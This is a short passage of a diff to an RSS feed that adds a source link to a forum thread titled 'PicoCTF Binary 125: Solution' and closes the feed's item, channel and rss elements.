+        <source url="https://d.clarkee.co.uk/t/picoctf-binary-125-solution/6131.rss">PicoCTF Binary 125: Solution</source>
+      </item>
+  </channel>
+</rss>
